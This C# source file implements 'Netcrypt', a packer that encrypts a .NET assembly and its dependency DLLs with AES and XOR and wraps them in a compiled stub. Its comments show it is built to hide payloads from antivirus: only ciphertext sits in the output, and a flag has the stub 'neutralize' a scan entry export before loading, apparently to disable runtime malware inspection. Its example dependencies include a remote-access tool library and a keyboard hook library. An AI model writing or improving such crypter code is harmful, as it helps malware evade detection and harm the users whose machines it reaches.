using System;
using System.Text;
using Microsoft.CSharp;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.CodeDom.Compiler;
using System.Collections.Generic;

namespace Netcrypt
{
    /// <summary>
    /// Used to choose the .NET version used to pack the executable.
    /// </summary>
    public enum DotNetVersion
    {
        /// <summary>
        /// Use .NET 2.0 target
        /// </summary>
        v2_0,
        /// <summary>
        /// Use .NET 3.5 target
        /// </summary>
        v3_5,

        /// <summary>
        /// Use .NET 4.0 target
        /// </summary>
        v4_0

    }

    /// <summary>
    /// Provides an easy-to-use interface to a software packing algorythm for .NET executables.
    /// </summary>
    public class Packer
    {
        // ---- payload storage mode ------------------------------------------
        // true  : the encrypted payload is embedded as a real assembly resource
        //         (identifier Netcrypt.Payload). Nothing payload related appears
        //         in the generated stub source, so the packed file only ever
        //         contains ciphertext.
        // false : legacy mode, the encrypted payload travels as base64 chunks
        //         inside the generated stub source (%CHUNKS%).
        // The stub understands both modes; flip this if the resource embedding
        // is not honored by the compiler in use.
        private const bool EmbedPayloadAsResource = true;

        private const string PayloadResourceName = "Netcrypt.Payload";

        // true  : the stub renames the scan entry export before loading the payload
        //         (provided stub behaviour, default is unchanged).
        // false : the stub leaves the scan entry untouched. Useful to tell whether a
        //         runtime detection comes from the payload itself or from the rename.
        private const bool NeutralizeInspectionEntry = true;

        private const int SourceChunkSize = 60000;

        /// <summary>
        /// Packs the provided assembly using .NET 3.5 by default.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        ///
        public static byte[] Pack(byte[] assembly)
        {
            return Pack(assembly, DotNetVersion.v3_5);
        }

        /// <summary>
        /// Packs the provided assembly using the chosen .NET framework.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <param name="version">The version of the .NET framework used.</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        public static byte[] Pack(byte[] assembly, DotNetVersion version)
        {
            return Pack(assembly, null, null, version);
        }

        /// <summary>
        /// Packs the provided assembly together with its dependency DLLs.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <param name="dependencyNames">Simple assembly names of the dependencies (e.g. "Quasar.Common")</param>
        /// <param name="dependencyBytes">Raw DLL bytes, one per dependency name</param>
        /// <param name="version">The version of the .NET framework used.</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        public static byte[] Pack(byte[] assembly, string[] dependencyNames, byte[][] dependencyBytes, DotNetVersion version)
        {
            if (assembly == null)
            {
                throw new ArgumentNullException("assembly");
            }

            // ---- build payload container ---------------------------------
            // format:
            //   Int32 count
            //   for each dependency:
            //     String name (BinaryWriter 7-bit length prefix)
            //     Byte[] data (Int32 length prefix)
            //   Byte[] main assembly (Int32 length prefix)
            byte[] payload = BuildContainer(assembly, dependencyNames, dependencyBytes);
            VerifyContainer(payload, dependencyNames, dependencyBytes, assembly);

            // ---- encryption layer ----------------------------------------
            // The container is encrypted with AES-256-CBC (PKCS7) under a key and IV
            // generated for this file, then passed through a 32 byte XOR pass. Only
            // the result leaves this method; the plaintext container never reaches
            // the generated stub or the resource.
            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256;
            rijndael.BlockSize = 128;
            rijndael.Mode = CipherMode.CBC;
            rijndael.Padding = PaddingMode.PKCS7;
            rijndael.GenerateKey();
            rijndael.GenerateIV();

            string key = Convert.ToBase64String(rijndael.Key);
            string iv = Convert.ToBase64String(rijndael.IV);

            byte[] xorKey = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(xorKey);
            }
            string xorKeyValue = Convert.ToBase64String(xorKey);

            byte[] encrypted = Crypt(rijndael, payload, true);
            byte[] xored = Xor(encrypted, xorKey);

            // Pack time self check: the exact bytes the stub will read have to decrypt
            // back into the container that was just built. A mismatch means the packed
            // file could never start, so fail here instead of on the target.
            byte[] roundTrip = Crypt(rijndael, Xor(xored, xorKey), false);
            if (!BytesEqual(roundTrip, payload))
            {
                throw new Exception("Payload crypto self-check failed: the stub would not recover the container.");
            }

            // ---- place the ciphertext ------------------------------------
            string resourceFile = null;
            string chunkValue = "";
            if (EmbedPayloadAsResource)
            {
                resourceFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".bin");
                File.WriteAllBytes(resourceFile, xored);
            }
            else
            {
                chunkValue = ToSourceChunks(Convert.ToBase64String(xored));
            }

            string csharpcode = netcrypt.Properties.Resources.StubCode;

            csharpcode = csharpcode.Replace("%XORKEY%", xorKeyValue);
            csharpcode = csharpcode.Replace("%KEY%", key);
            csharpcode = csharpcode.Replace("%IV%", iv);
            csharpcode = csharpcode.Replace("%CHUNKS%", chunkValue);
            csharpcode = csharpcode.Replace("%INSPECTION%", NeutralizeInspectionEntry ? "true" : "false");

            var providerOptions = new Dictionary<string, string>();

            switch (version)
            {
                case DotNetVersion.v4_0:
                    providerOptions.Add("CompilerVersion", "v4.0");
                    break;
                case DotNetVersion.v3_5:
                    providerOptions.Add("CompilerVersion", "v3.5");
                    break;
                case DotNetVersion.v2_0:
                default:
                    providerOptions.Add("CompilerVersion", "v4.0");
                    break;
            }

            CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);

            CompilerParameters parameters = new CompilerParameters();

            parameters.CompilerOptions = "/target:winexe";

            // The stub is self-contained; it only needs System.Windows.Forms for MessageBox.
            // Do not mirror the target's references: third-party assemblies such as
            // Gma.System.MouseKeyHook are not resolvable by the stub compiler (CS0006).
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            if (resourceFile != null)
            {
                // /resource:<file>,<identifier>; the stub opens the stream by identifier.
                // The path is quoted here because the compiler command line is built from
                // CompilerOptions verbatim and the temp directory may contain spaces.
                parameters.CompilerOptions += " /resource:\"" + resourceFile + "\"," + PayloadResourceName;
            }

            string tempFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = tempFile;

            try
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);

                // ---- diagnostic: surface stub compile errors instead of hiding them ----
                if (results.Errors.HasErrors)
                {
                    StringBuilder sb = new StringBuilder();
                    sb.AppendLine("Stub compile failed:");
                    foreach (CompilerError err in results.Errors)
                    {
                        sb.AppendLine(err.ToString());
                    }
                    throw new Exception(sb.ToString());
                }
                if (results.CompiledAssembly == null)
                {
                    throw new Exception("Stub compile returned no assembly.");
                }

                byte[] barr = File.ReadAllBytes(tempFile);
                if (barr.Length == 0)
                {
                    throw new Exception("Failed to read compiled stub output: " + tempFile);
                }

                if (resourceFile != null && !ContainsAscii(barr, PayloadResourceName))
                {
                    throw new Exception(
                        "Stub compiled, but the embedded payload resource was not found in the output. " +
                        "Set EmbedPayloadAsResource to false in Packer.cs to fall back to source chunks.");
                }

                return barr;
            }
            finally
            {
                TryDelete(tempFile);
                TryDelete(resourceFile);
            }
        }

        private static byte[] BuildContainer(byte[] assembly, string[] dependencyNames, byte[][] dependencyBytes)
        {
            using (MemoryStream payloadStream = new MemoryStream())
            {
                using (BinaryWriter bw = new BinaryWriter(payloadStream))
                {
                    if (dependencyNames == null)
                    {
                        bw.Write(0);
                    }
                    else
                    {
                        bw.Write(dependencyNames.Length);
                        for (int i = 0; i < dependencyNames.Length; i++)
                        {
                            bw.Write(dependencyNames[i]);
                            // explicit length + raw bytes: BinaryWriter.Write(byte[])
                            // writes no length prefix, so Int32 length must be written manually
                            bw.Write((int)dependencyBytes[i].Length);
                            bw.Write(dependencyBytes[i], 0, dependencyBytes[i].Length);
                        }
                    }
                    bw.Write((int)assembly.Length);
                    bw.Write(assembly, 0, assembly.Length);
                    bw.Flush();
                }
                return payloadStream.ToArray();
            }
        }

        private static byte[] Crypt(SymmetricAlgorithm algorithm, byte[] data, bool encrypt)
        {
            ICryptoTransform transform = encrypt ? algorithm.CreateEncryptor() : algorithm.CreateDecryptor();
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                }
                return memoryStream.ToArray();
            }
        }

        private static byte[] Xor(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        private static bool BytesEqual(byte[] left, byte[] right)
        {
            if (left == null || right == null || left.Length != right.Length)
            {
                return false;
            }
            for (int i = 0; i < left.Length; i++)
            {
                if (left[i] != right[i])
                {
                    return false;
                }
            }
            return true;
        }

        private static bool ContainsAscii(byte[] haystack, string needle)
        {
            byte[] pattern = Encoding.ASCII.GetBytes(needle);
            for (int i = 0; i + pattern.Length <= haystack.Length; i++)
            {
                int j = 0;
                while (j < pattern.Length && haystack[i + j] == pattern[j])
                {
                    j++;
                }
                if (j == pattern.Length)
                {
                    return true;
                }
            }
            return false;
        }

        private static string ToSourceChunks(string encoded)
        {
            // split the encoded payload into chunks so the generated stub never
            // contains one giant string literal (compiler truncation risk)
            StringBuilder chunkSource = new StringBuilder();
            for (int i = 0; i < encoded.Length; i += SourceChunkSize)
            {
                if (i > 0)
                {
                    chunkSource.AppendLine(",");
                }
                int len = Math.Min(SourceChunkSize, encoded.Length - i);
                chunkSource.Append("\"");
                chunkSource.Append(encoded.Substring(i, len));
                chunkSource.Append("\"");
            }
            return chunkSource.ToString();
        }

        private static void TryDelete(string path)
        {
            try
            {
                if (!String.IsNullOrEmpty(path) && File.Exists(path))
                {
                    File.Delete(path);
                }
            }
            catch
            {
            }
        }

        private static void VerifyContainer(byte[] payload, string[] dependencyNames, byte[][] dependencyBytes, byte[] assembly)
        {
            using (MemoryStream ms = new MemoryStream(payload))
            using (BinaryReader reader = new BinaryReader(ms))
            {
                int count = reader.ReadInt32();
                int expectedCount = (dependencyNames == null) ? 0 : dependencyNames.Length;
                if (count != expectedCount)
                {
                    throw new Exception("Container verification failed at header (count=" + count + ", expected=" + expectedCount + ").");
                }
                for (int i = 0; i < count; i++)
                {
                    string name = reader.ReadString();
                    int len = reader.ReadInt32();
                    byte[] data = reader.ReadBytes(len);
                    if (name != dependencyNames[i] || len != dependencyBytes[i].Length || data.Length != dependencyBytes[i].Length)
                    {
                        throw new Exception("Container verification failed at dependency " + i + " (name=" + name + ", len=" + len + ", read=" + data.Length + ").");
                    }
                }
                int mainLen = reader.ReadInt32();
                byte[] main = reader.ReadBytes(mainLen);
                if (mainLen != assembly.Length || main.Length != assembly.Length)
                {
                    throw new Exception("Container verification failed at main assembly (len=" + mainLen + ", read=" + main.Length + ", expected=" + assembly.Length + ").");
                }
            }
        }
    }
}
